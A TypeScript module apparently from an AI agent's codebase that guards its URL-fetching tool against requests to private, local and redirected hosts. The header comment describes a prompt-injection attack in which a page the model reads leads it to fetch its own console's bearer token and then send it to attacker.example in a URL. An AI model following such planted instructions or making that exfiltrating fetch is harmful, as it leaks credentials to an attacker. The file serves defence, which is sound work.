/**
 * Outbound-URL guard for tools that fetch what the model asks for.
 *
 * WHY. `web.fetch_url` is read-only, so it runs without approval, and it only
 * checked the scheme. A page Flint read could tell it to fetch
 * http://127.0.0.1:8080/ — Flint's own console, which carries its bearer token —
 * and then fetch https://attacker.example/?t=<token>: two approval-free steps.
 * deep_research already refused private hosts by name; this is that check, made
 * shared, plus two things it lacked: a DNS lookup before connecting (a public-
 * looking name can resolve to 127.0.0.1) and a check on EVERY redirect hop
 * rather than only the last one (by then the private request was already made).
 *
 * Residual risk, accepted: the lookup and the connection resolve separately, so a
 * name that re-points between them (DNS rebinding with a zero TTL) can still
 * slip through. Pinning the connection to the checked address would close it.
 */
import { lookup } from 'node:dns/promises';
import { isIP } from 'node:net';
import { networkInterfaces } from 'node:os';

/**
 * A URL the guard will not fetch on POLICY grounds (a private or local target, a
 * scheme other than http(s)). A fetch that merely failed (DNS, too many
 * redirects) is a plain Error, so a tool can say "refused" only when it was.
 */
export class UrlRefused extends Error {
  constructor(reason: string) {
    super(reason);
    this.name = 'UrlRefused';
  }
}

/**
 * Loopback, private, link-local, CGNAT/Tailscale, multicast/reserved, and the
 * local-only names (.local, .localhost, .internal, .ts.net, bare intranet names).
 * Takes a hostname or an IP literal, with or without IPv6 brackets.
 */
export function isPrivateHost(host: string): boolean {
  const h = host.toLowerCase().replace(/^\[|\]$/g, '');
  if (h === 'localhost' || h.endsWith('.localhost') || h.endsWith('.local') || h.endsWith('.internal') || h.endsWith('.ts.net')) return true;
  if (!h.includes('.') && !h.includes(':')) return true; // bare intranet names
  if (h.includes(':')) return h === '::1' || h === '::' || /^(fc|fd|fe80)/.test(h) || h.startsWith('::ffff:');
  const m = h.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
  if (!m) return false;
  const [a, b] = [Number(m[1]), Number(m[2])];
  return (
    a === 0 || a === 10 || a === 127 || (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) ||
    (a === 192 && b === 168) || (a === 100 && b >= 64 && b <= 127) || a >= 224
  );
}

export type Resolve = (host: string) => Promise<string[]>;

const resolveAll: Resolve = async (host) => (await lookup(host, { all: true, verbatim: true })).map((r) => r.address);

/** This machine's own addresses, and the /64 of each of its global IPv6 networks. */
export interface LocalAddresses {
  exact: Set<string>;
  v6Prefixes: Set<string>;
}

/** The eight hextets of an IPv6 address, zone id dropped, or undefined. */
function hextets(addr: string): string[] | undefined {
  const a = addr.toLowerCase().replace(/^\[|\]$/g, '').replace(/%.*$/, '');
  if (!a.includes(':')) return undefined;
  const [head, tail] = a.split('::') as [string, string | undefined];
  const h = head ? head.split(':') : [];
  const t = tail !== undefined && tail !== '' ? tail.split(':') : [];
  if (t.length && t[t.length - 1]!.includes('.')) return undefined; // embedded IPv4: handled by isPrivateHost
  const fill = tail !== undefined ? Array(8 - h.length - t.length).fill('0') : [];
  const all = [...h, ...fill, ...t].map((x) => x.padStart(4, '0'));
  return all.length === 8 ? all : undefined;
}

const prefix64 = (addr: string): string | undefined => hextets(addr)?.slice(0, 4).join(':');

/**
 * Read from the interfaces each time (addresses change: temporary IPv6, Wi-Fi).
 * A public IPv6 address of this Mac, or a neighbour on its /64, is as local as
 * 127.0.0.1 to a service bound to `::`, though no address range says so.
 */
export function localAddresses(): LocalAddresses {
  const exact = new Set<string>();
  const v6Prefixes = new Set<string>();
  for (const list of Object.values(networkInterfaces())) {
    for (const i of list ?? []) {
      const addr = i.address.toLowerCase().replace(/%.*$/, '');
      exact.add(addr);
      if (i.family === 'IPv6' && !i.internal && !/^fe80/.test(addr)) {
        const p = prefix64(addr);
        if (p) v6Prefixes.add(p);
      }
    }
  }
  return { exact, v6Prefixes };
}

function isThisNetwork(addr: string, local: LocalAddresses): boolean {
  const a = addr.toLowerCase().replace(/^\[|\]$/g, '').replace(/%.*$/, '');
  if (local.exact.has(a)) return true;
  const p = prefix64(a);
  return p !== undefined && local.v6Prefixes.has(p);
}

export interface GuardOptions {
  resolve?: Resolve;
  signal?: AbortSignal;
  /** This host's addresses; injected in tests. */
  local?: () => LocalAddresses;
}

/** `p`, or the signal's reason as soon as it aborts. */
function abortable<T>(p: Promise<T>, signal?: AbortSignal): Promise<T> {
  if (!signal) return p;
  signal.throwIfAborted();
  return new Promise<T>((resolve, reject) => {
    const onAbort = () => reject(signal.reason);
    signal.addEventListener('abort', onAbort, { once: true });
    p.then(
      (v) => {
        signal.removeEventListener('abort', onAbort);
        resolve(v);
      },
      (e) => {
        signal.removeEventListener('abort', onAbort);
        reject(e);
      },
    );
  });
}

/**
 * The URL, parsed, if it is http(s) to a public host whose every DNS address is
 * public and not this machine or its network; otherwise throws UrlRefused (a DNS
 * failure is a plain Error). WHATWG URL parsing normalises numeric hosts first
 * (`http://2130706433/` and `http://0x7f.1/` both become 127.0.0.1).
 */
export async function assertPublicUrl(raw: string | URL, resolve: Resolve = resolveAll, opts: GuardOptions = {}): Promise<URL> {
  const local = (opts.local ?? localAddresses)();
  let u: URL;
  try {
    u = typeof raw === 'string' ? new URL(raw) : raw;
  } catch {
    throw new UrlRefused('not a valid URL');
  }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') throw new UrlRefused('only http(s) URLs are fetched');
  const host = u.hostname;
  if (isPrivateHost(host) || isThisNetwork(host, local)) throw new UrlRefused(`${host} is a private or local address`);
  if (isIP(host.replace(/^\[|\]$/g, '')) === 0) {
    let addrs: string[];
    try {
      addrs = await abortable(resolve(host), opts.signal);
    } catch (e) {
      if (opts.signal?.aborted) throw e;
      throw new Error(`${host} did not resolve`);
    }
    if (addrs.length === 0) throw new Error(`${host} did not resolve`);
    if (addrs.some((a) => isPrivateHost(a) || isThisNetwork(a, local))) {
      throw new UrlRefused(`${host} resolves to a private or local address`);
    }
  }
  return u;
}

export interface GuardedFetchOptions {
  /** Default 20, as fetch's own. Each hop is checked, so a higher cap costs no safety. */
  maxRedirects?: number;
  resolve?: Resolve;
  /** Injected in tests. */
  fetchImpl?: typeof fetch;
  local?: () => LocalAddresses;
}

/**
 * A Location header with raw UTF-8 bytes arrives as latin1 text. Decode it the way
 * fetch's own redirect handling does, or `new URL` percent-encodes each byte and
 * the next hop asks for a mangled path.
 */
export function decodeLocation(location: string): string {
  if (!/[\u0080-\u00ff]/.test(location)) return location;
  try {
    return new TextDecoder('utf-8', { fatal: true }).decode(Buffer.from(location, 'latin1'));
  } catch {
    return location;
  }
}

/**
 * fetch(), with redirects followed by hand so every hop passes assertPublicUrl
 * BEFORE it is requested. The final response is returned as-is (any status).
 */
export async function guardedFetch(url: string, init: RequestInit = {}, opts: GuardedFetchOptions = {}): Promise<Response> {
  const fetchImpl = opts.fetchImpl ?? fetch;
  const max = opts.maxRedirects ?? 20;
  const signal = init.signal ?? undefined;
  const guard: GuardOptions = { ...(signal ? { signal } : {}), ...(opts.local ? { local: opts.local } : {}) };
  let current = await assertPublicUrl(url, opts.resolve, guard);
  for (let hop = 0; ; hop++) {
    signal?.throwIfAborted();
    const res = await fetchImpl(current, { ...init, redirect: 'manual' });
    const location = res.status >= 300 && res.status < 400 ? res.headers.get('location') : null;
    if (!location) return res;
    await res.body?.cancel().catch(() => {}); // not read; free the connection
    if (hop >= max) throw new Error(`more than ${max} redirects`);
    current = await assertPublicUrl(new URL(decodeLocation(location), current), opts.resolve, guard);
  }
}
